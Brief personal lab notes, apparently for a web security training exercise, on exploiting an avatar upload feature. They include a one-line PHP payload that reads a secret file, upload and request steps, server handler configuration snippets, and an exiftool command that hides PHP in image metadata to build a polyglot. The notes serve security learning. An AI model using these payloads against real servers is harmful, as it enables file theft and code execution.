# Lab Notes – File Upload + Path Traversal

## Steps
1. **Login & Upload Avatar**  
   - Upload image → check Burp Proxy → image served via `GET /files/avatars/<image>`.

2. **Create Exploit**
```
 <?php echo file_get_contents('/home/carlos/secret'); ?>
```

 3. Upload `exploit.php` as avatar (PHP upload allowed).
 4. Initial Test: 
```
 Request `GET /files/avatars/exploit.php`.
    
 Server returns **raw code** (not executed).
```






### Anathor cheatshett 



```
/etc/apache2/apache2.conf

LoadModule php_module /usr/lib/apache2/modules/libphp.so 
AddType application/x-httpd-php .php
```

```
<staticContent> <mimeMap fileExtension=".json" mimeType="application/json" /> </staticContent>
```


###  Exiftool technique 

```

exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php

```
